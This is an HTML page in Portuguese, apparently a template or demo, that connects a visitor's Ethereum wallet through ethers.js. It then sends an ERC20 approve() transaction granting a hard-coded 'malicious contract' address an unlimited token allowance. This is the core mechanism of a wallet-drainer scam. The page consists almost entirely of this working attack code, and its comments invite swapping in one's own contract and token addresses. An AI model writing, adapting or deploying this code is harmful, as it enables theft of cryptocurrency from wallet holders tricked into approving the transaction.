<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Aprovação de Contrato Malicioso</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/dist/ethers.umd.min.js"></script>
</head>
<body>
    <h2>Conectar Carteira & Aprovar Contrato Malicioso</h2>
    <button id="connectWallet">Conectar Carteira</button>
    <button id="approveMaliciousContract" style="display: none;">Aprovar Contrato Malicioso</button>
    <script>
        const connectWalletButton = document.getElementById('connectWallet');
        const approveMaliciousContractButton = document.getElementById('approveMaliciousContract');

        // Endereço do contrato malicioso (substitua pelo seu endereço do contrato)
        const maliciousContractAddress = '0x4137A1310ed57E2D97e0c0fff83F56099aAe25C9';
        // Endereço do token ERC20 (substitua pelo endereço do token que deseja usar)
        const tokenAddress = '0x1Ef397Cca4296D988EDDD7479479387B340Ff1f1';
        // ABI simplificada do ERC20 focada na função approve
        const tokenABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
        ];
        // Defina a quantidade máxima (para fins de demo, usaremos "unlimited")
        const maxUint256 = ethers.constants.MaxUint256;

        connectWalletButton.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    approveMaliciousContractButton.style.display = 'block';
                } catch (error) {
                    console.error('Usuário negou acesso à carteira.');
                }
            } else {
                alert('Por favor, instale o MetaMask ou outra carteira Ethereum compatível.');
            }
        });

        approveMaliciousContractButton.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const signer = provider.getSigner();
                    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
                    const tx = await tokenContract.approve(maliciousContractAddress, maxUint256);
                    await tx.wait();
                    alert('Contrato Malicioso aprovado com sucesso.');
                } catch (error) {
                    console.error(error);
                    alert('Houve um erro ao aprovar o contrato malicioso.');
                }
            }
        });
    </script>
</body>
</html>
